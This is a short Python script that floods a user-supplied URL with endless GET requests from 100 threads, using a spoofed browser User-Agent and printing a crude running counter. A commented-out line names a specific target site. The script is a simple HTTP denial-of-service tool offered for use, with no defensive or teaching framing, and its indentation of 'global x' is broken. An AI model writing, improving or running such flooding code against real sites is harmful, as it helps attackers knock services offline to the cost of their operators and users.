import requests, threading, readline, os
from colorama import Fore, Style

#url = 'http://justice.rf.gd/log/log.php'
#url = input("Enter url: ")

if(os.path.exists('last_url.txt')):
	f = open('last_url.txt', 'r')
	f = f.read().splitlines()
	if f is None or f == '':
		pass
	else:
		print('last url: '+str(f))
	url = input("Enter url: ")
	f = open('last_url.txt', 'w')
	f.write(url)
	f.close()

else:
	url = input("Enter url: ")
	f = open('last_url.txt', 'w')
	f.write(url)
	f.close()



headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"}
x = 0

def hell():
	while True:
    global x
		x+=1
		requests.get(url, headers=headers)
		print(f'{Style.BRIGHT}{Fore.MAGENTA}[{Fore.RED}*{Fore.MAGENTA}]{Fore.CYAN} sending SHITS {Fore.YELLOW}[{Fore.GREEN}{x}{Fore.YELLOW}]{Fore.MAGENTA} {url}')

power = 100

for i in range(power):
	threading.Thread(target=hell).start()
